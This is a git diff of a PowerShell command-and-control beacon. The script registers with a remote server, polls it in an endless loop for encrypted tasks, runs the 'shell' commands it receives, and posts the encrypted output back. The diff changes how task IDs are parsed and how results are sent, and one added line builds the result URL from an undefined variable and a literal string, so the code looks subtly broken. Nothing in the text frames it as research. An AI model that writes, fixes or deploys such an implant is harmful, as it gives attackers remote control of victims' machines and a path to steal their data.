@@ -92,11 +92,12 @@ $data  = @{
     }
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
 
-$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
+$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 
 for (;;){
     
+    ### check response NOT existence
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
     
     if (-Not [string]::IsNullOrEmpty($task)){
@@ -104,11 +105,12 @@ for (;;){
         $task = Decrypt $key $task
         $task = $task.split()
         $flag = $task[0]
+        $taskId = $task[1]
         
         if ($flag -eq "VALID"){
             
-            $command = $task[1]
-            $args    = $task[2..$task.Length]
+            $command = $task[2]
+            $args    = $task[3..$task.Length]
 
             if ($command -eq "shell"){
             
@@ -120,6 +122,8 @@ for (;;){
                 $res  = shell $f $arg
                 $res  = Encrypt $key $res
                 $data = @{result = "$res"}
+
+                $resultl = ("$result" + "taskId")
                 
                 Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
 
